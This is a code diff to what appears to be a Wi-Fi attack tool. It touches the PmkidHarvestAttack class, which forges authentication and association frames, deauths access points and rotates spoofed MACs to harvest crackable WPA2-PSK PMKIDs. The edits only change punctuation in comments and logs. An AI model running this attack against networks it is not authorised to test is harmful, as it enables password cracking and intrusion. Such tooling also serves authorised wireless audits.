@@ -4,15 +4,15 @@ Sequence per attempt:
     1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
     2. Listen briefly for Auth Resp (status=0 means the AP will engage).
     3. Inject Assoc Req carrying a forced-PSK RSN IE (the AP's ciphers, AKM=PSK)
-       + SSID + rates — a client selects one AKM, and PSK is what yields a
+       + SSID + rates, a client selects one AKM, and PSK is what yields a
        harvestable PMKID; we bail first if the AP offers no PSK AKM.
-    4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
+    4. Wait for the AP's EAPOL M1. Many WPA2-PSK APs ship a PMKID KDE in
        the Key Data. The existing frame parser surfaces it as
        ``parsed['eapol_pmkid']`` and the WlanInterface populates
        ``AP.handshakes[source].pmkid`` for free.
     5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
        send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
-       none — give up rather than retry the same empty M1 — and even on success
+       none. Give up rather than retry the same empty M1, and even on success
        the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
        the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).
 
@@ -158,7 +158,7 @@ class PmkidHarvestAttack(Campaign):
         # PMF Required: the AP only associates protected (802.11w) clients
         if self.target.pmf_required:
             self.fail_reason = PmkidFail.PMF_REQUIRED
-            logger.info("[PMKID] %s is PMF-Required — unharvestable, skipping.",
+            logger.info("[PMKID] %s is PMF-Required, unharvestable, skipping.",
                         self.target.bssid)
             return
 
@@ -167,7 +167,7 @@ class PmkidHarvestAttack(Campaign):
                     if a in (self.target.akm_suites or ())), None)
         if akm is None:
             self.fail_reason = PmkidFail.NO_PSK_AKM
-            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
+            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s), can't harvest.",
                         self.target.bssid, self.target.akm_suites)
             return
         # The generic is a valid RSN IE
@@ -222,22 +222,22 @@ class PmkidHarvestAttack(Campaign):
                             f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                             f"(STA {_mac_bytes_to_str(self.source_mac)})"
                         )
-                        self.log("M1 received — PMKID present")
+                        self.log("M1 received: PMKID present")
                         self.pmkid = hs.pmkid
                         return
                     self.fail_reason = PmkidFail.NO_KDE
                     logger.info(
-                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
+                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1: "
                         f"this AP doesn't expose one; not retrying."
                     )
-                    self.log("M1 received — no PMKID KDE")
+                    self.log("M1 received: no PMKID KDE")
                     return
                 await asyncio.sleep(0.05)
 
             logger.info(
-                f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
+                f"[PMKID] Attempt {attempt}: no M1 (AP silent), rotating MAC and retrying."
             )
-            self.log("no M1 (AP silent) — rotating MAC")
+            self.log("no M1 (AP silent), rotating MAC")
             self._rotate_mac()
 
         self.fail_reason = PmkidFail.NO_RESPONSE
